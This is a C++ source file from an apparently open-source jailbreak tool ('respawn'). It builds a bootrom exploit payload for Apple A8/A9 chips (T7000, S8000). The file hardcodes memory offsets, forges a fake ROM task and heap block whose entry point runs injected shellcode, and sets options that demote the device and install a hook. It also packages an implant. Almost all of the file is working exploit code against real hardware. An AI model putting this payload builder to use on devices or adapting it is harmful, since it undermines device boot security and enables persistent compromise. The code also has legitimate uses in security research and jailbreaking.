//
//  Copyright (c) 2022-2023 Jon Palmisciano. All rights reserved.
//
//  Use of this source code is governed by the BSD 3-Clause license; a full
//  copy of the license can be found in the LICENSE.txt file.
//

#include "respawn/payload/builder.h"

#include "respawn/dfu.h"
#include "respawn/payload/constants.h"
#include "respawn/payload/types.h"

#include "bootstrap.h"
#include "implant.h"

struct PayloadAppendixA8A9 {
  RomTask synopsys_task{};
  RomHeapBlock heap_block{};
  RomTask fake_task{};
};

struct OffsetsA8A9 {
  uint64_t io_buffer;
  uint64_t arch_task_tramp_fn;
  uint64_t synopsys_routine_fn;

  uint64_t dfu_base;
  uint64_t serial;
  uint64_t usb_serial_desc;
  uint64_t dfu_handle_request_fn_ptr;
  uint64_t copy_dest;
  uint64_t usb_transfer_fn;
  uint64_t chipid_base;
  uint64_t usb_create_desc_fn;
};

constexpr OffsetsA8A9 offsets_t7000 = {
    .io_buffer = 0x18010D300,
    .arch_task_tramp_fn = 0x10000D988,
    .synopsys_routine_fn = 0x100005530,
    .dfu_base = 0x180380000,
    .serial = 0x1800888C8,
    .usb_serial_desc = 0x18008062A,
    .dfu_handle_request_fn_ptr = 0x180088878,
    .copy_dest = 0x1800E0C00,
    .usb_transfer_fn = 0x10000ebb4,
    .chipid_base = 0x20E02A000,
    .usb_create_desc_fn = 0x10000E074,
};

constexpr OffsetsA8A9 offsets_s8000 = {
    .io_buffer = 0x18010D500,
    .arch_task_tramp_fn = 0x10000D998,
    .synopsys_routine_fn = 0x100006718,
    .dfu_base = 0x180380000,
    .serial = 0x180087958,
    .usb_serial_desc = 0x1800807DA,
    .dfu_handle_request_fn_ptr = 0x1800878F8,
    .copy_dest = 0x1800E0C00,
    .usb_transfer_fn = 0x10000EE78,
    .chipid_base = 0x2102BC000,
    .usb_create_desc_fn = 0x10000E354,
};

std::vector<uint8_t>
PayloadBuilder::make_payload_a8a9(OffsetsA8A9 const &offsets,
                                  unsigned char const *shellcode,
                                  size_t shellcode_size) {
  PayloadAppendixA8A9 appendix{};

  auto const shared_stack_base =
      offsets.io_buffer + offsetof(PayloadAppendixA8A9, fake_task);

  auto populate_synopsys_task = [=, &offsets](RomTask &task) {
    // Nothing before the callout member is copied, so there is no need to
    // populate those fields, e.g. the start magic.

    task.stack_base = shared_stack_base;
    task.stack_len = TASK_STACK_LEN_MIN;

    task.waiters.prev = task.stack_base + offsetof(RomTask, queue);
    task.waiters.next = task.waiters.prev;
    task.routine = offsets.synopsys_routine_fn;

    std::strcpy(task.name, "usb");
    task.id = 5;
    task.end_magic = TASK_END_MAGIC;
  };

  auto populate_fake_task = [=, &offsets](RomTask &task) {
    task.start_magic = TASK_START_MAGIC;

    task.queue.prev = offsets.io_buffer + offsetof(RomTask, waiters);
    task.queue.next = task.queue.prev;
    task.state = ROM_TASK_STATE_RUNNING;
    task.irq_disable_count = 1;

    task.stack_base = shared_stack_base;
    task.stack_len = TASK_STACK_LEN_MIN;

    // Populate saved registers with values to pass to the shellcode.
    task.arch.x[REG_DFU_BASE] = offsets.dfu_base;
    task.arch.x[REG_SERIAL] = offsets.serial;
    task.arch.x[REG_USB_SERIAL_DESC] = offsets.usb_serial_desc;
    task.arch.x[REG_DFU_HANDLE_REQUEST_FN_PTR] =
        offsets.dfu_handle_request_fn_ptr;
    task.arch.x[REG_COPY_DEST] = offsets.copy_dest;
    task.arch.x[REG_USB_TRANSFER_FN] = offsets.usb_transfer_fn;
    task.arch.x[REG_CHIPID_BASE] = offsets.chipid_base;
    task.arch.x[REG_USB_CREATE_DESC_FN] = offsets.usb_create_desc_fn;
    task.arch.x[REG_OPTIONS] = OPT_DEMOTE | OPT_TAG_SERIAL | OPT_INSTALL_HOOK;

    task.arch.sp = task.stack_base + task.stack_len;
    task.arch.lr = offsets.arch_task_tramp_fn;

    // Copy shellcode into saved vector registers space.
    std::memcpy(task.arch.vregs, shellcode, shellcode_size);

    task.waiters.prev = task.stack_base + offsetof(RomTask, waiters);
    task.waiters.next = task.waiters.prev;

    // Point the task's entry point to the shellcode.
    task.routine = task.stack_base + offsetof(RomTask, arch.vregs);

    std::strcpy(task.name, "rspn");
    task.id = 6;
    task.end_magic = TASK_END_MAGIC;
  };

  populate_synopsys_task(appendix.synopsys_task);

  // The "size" members on heap blocks are measured in units of the size of the
  // heap block structure.
  appendix.heap_block.prev_size =
      sizeof(appendix.synopsys_task) / sizeof(RomHeapBlock) + 1;
  appendix.heap_block.size =
      appendix.synopsys_task.stack_len / sizeof(RomHeapBlock) + 2;

  populate_fake_task(appendix.fake_task);

  auto payload = reinterpret_cast<uint8_t *>(&appendix.synopsys_task.callout);
  return {payload, payload + sizeof(PayloadAppendixA8A9) -
                       offsetof(PayloadAppendixA8A9, synopsys_task.callout)};
}

uint32_t PayloadBuilder::overwrite_size(Chip chip) {
  // This once mattered when T8015 was supported but remains in case said
  // support is added back one day.
  (void)chip;

  return offsetof(PayloadAppendixA8A9, synopsys_task.callout);
}

std::vector<uint8_t> PayloadBuilder::make_bootstrap(Chip chip) {
  return make_payload_a8a9(chip == Chip::T7000 ? offsets_t7000 : offsets_s8000,
                           bootstrap, bootstrap_len);
}

std::vector<uint8_t> PayloadBuilder::make_implant() {
  return {implant, implant + implant_len};
}
